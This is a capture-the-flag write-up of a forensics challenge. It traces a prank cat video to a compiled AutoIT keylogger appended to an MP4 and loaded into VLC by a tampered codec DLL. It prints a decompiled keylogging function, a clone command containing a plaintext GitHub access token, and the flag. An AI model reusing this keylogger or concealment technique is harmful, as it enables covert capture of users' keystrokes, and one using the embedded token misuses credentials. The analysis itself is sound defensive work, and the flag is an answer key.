## Title
CHIPI CHIPI CHAPA CHAPA

## Description
This April Fool's Day, my coworker Alonso decided to prank me. Back then, I forgot to lock my computer before heading out to have a lunch. While I was away, Alonso sneaked into my computer and installed some program that plays a cat video every time I turn my computer on. Just like all software developers, I'm so lazy - it's May now and I still haven't got time to figure out how to remove that video player from my computer once and for all.

## Solution

### The virtual machine

The task description mentions that a cat video starts playing whenever the virtual machines starts up. Indeed, the VM is configured to open the video located at `C:\Users\user\AppData\Roaming\vlc-3.0.20\videoToPlay.mp4` inside VLC Media Player upon startup.  
The installation of VLC Media Player is located at `C:\Users\user\AppData\Roaming\vlc-3.0.20`, in the same folder as the video. It is notable that this folder additionally contains a highly suspicious `AutoIt3_x64.exe` interpreter of the AutoIT language, as well as a folder named `Include`, which stores AutoIT header files. Both the AutoIT interpreter executable and the `Include` folder are hidden.  
The memory of the running VLC process is suspicious as well, because its examination with a debugger (e.g. x64dbg) reveals an RWX region that stores the `AutoIT3` interpreter executable.  
Furthermore, a thorough inspection of the files located in the directory of the VLC media player can reveal a suspicious string inside the `C:\Users\user\AppData\Roaming\vlc-3.0.20\plugins\codec\libavcodec_plugin.dll` library, namely the path to the hidden AutoIT executable. This path is used by a malicious reflective loader that loads the AutoIT interpreter in the context of the VLC player process as soon as the cat video starts playing.  
According to the documentation for AutoIT(https://www.autoitscript.com/autoit3/docs/intro/running.htm), the interpreter executes the script specified in the first command line argument. For the VLC process, the value of the first argument is `videoToPlay.mp4`.  
An examination of the `videoToPlay.mp4` file further reveals that it has an additional blob of data appended to it, which contains the bytes `AU3!EA06` - a Google search on them indicates that this byte sequence can be found used inside compiled AutoIT scripts. Thus, the MP4 file with the cat video contains a compiled AutoIT payload inside it, which needs to be decompiled for further analysis.

### AutoIT payload analysis

Upon decompiling the AutoIT script, we can find out that it performs keylogging. It periodically retrieves the keyboard state (that specifies which keys are pressed at a certain moment of time) and writes it to the file `C:\Users\user\AppData\Roaming\vlc-3.0.20\c_256.nls`:

    Func _GetDIData($hWnd, $Msg, $iIDTimer, $dwTime)
    	_ZeroMemory(DllStructGetPtr($curState), DllStructGetSize($curState))
    	With $trdddd
    		$hr = .GetDeviceState(DllStructGetSize($curState), DllStructGetPtr($curState))
    	EndWith
    	_MoveMemory(DllStructGetPtr($prevState), DllStructGetPtr($curState), DllStructGetSize($curState))
    	_MoveMemory($keylogData + 256 * $currentIndex, DllStructGetPtr($curState), DllStructGetSize($curState))
    	$currentIndex = $currentIndex + 1
    	$bytesWritten = 0
    	If $currentIndex = 100 Then
    		_WinAPI_WriteFile($fileHandle, $keylogData, 256 * 100, $bytesWritten)
    		_WinAPI_FlushFileBuffers ($fileHandle)
    		$currentIndex = 0
    	EndIf
    EndFunc


### Keylog file parsing

As mentioned above, the keylog file has keyboard state information written to it. By looking at the AutoIT code, we can infer that each state is a 256-byte array. In this array, a key is marked as pressed if the value corresponding to the key index is not zero. The script that can be used to parse the keyboard states can be found in the `writeup` folder.  
The output of the script contains the following command: `git clone https://drovosec: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@github.com/drovosec/sasctfquals-24`. Once the repository is cloned, it is possible to explore its branches to find the flag for this task, along with fake flags and funny jokes about other challenges.


## Flag
SAS{h4h4_d1d_y0u_r34lly_th1nk_th4t_r3p0_h4d_411_th3_fl4g5}

**Solved by:** 2 teams